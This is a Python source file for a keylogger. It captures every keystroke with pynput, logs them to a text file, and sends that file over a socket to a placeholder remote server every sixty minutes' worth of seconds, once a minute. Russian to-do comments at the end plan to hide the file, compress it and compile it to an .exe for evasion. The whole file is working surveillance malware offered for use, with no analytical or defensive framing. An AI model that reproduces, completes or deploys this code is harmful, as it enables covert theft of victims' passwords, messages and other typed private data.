import socket
from pynput.keyboard import Key, Listener
import logging
import threading
import time

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level = logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(str(key))

def start_key_logger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def send_file(server_ip, server_port, file_path):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    with open(file_path, 'rb') as file:
        while True:
            data = file.read(1024)
            if not data:
                break
            client_socket.sendall(data)
    client_socket.close()

def periodic_send(server_ip, server_port, file_path, interval=60):
    while True:
        send_file(server_ip,server_port, file_path)
        time.sleep(interval)


if __name__ == "__main__":
    SERVER_IP = "IP Сервера"
    SERVER_PORT = "Port Сервера"

    file_path = log_dir + "keylogs.txt"

    keylogger_thread = threading.Thread(target=start_key_logger, daemon=True)
    keylogger_thread.start()

    periodic_send(SERVER_IP, SERVER_PORT, file_path, interval=60)

    # ЧТО НУЖНО ДОДЕЛАТЬ?
    # СКРЫТИЕ ФАЙЛА
    # СЖАТИЕ ФАЙЛА ДО МИНИМАЛЬНЫХ РАЗМЕРОВ
    # КОМПИЛЯЦИЯ В .EXE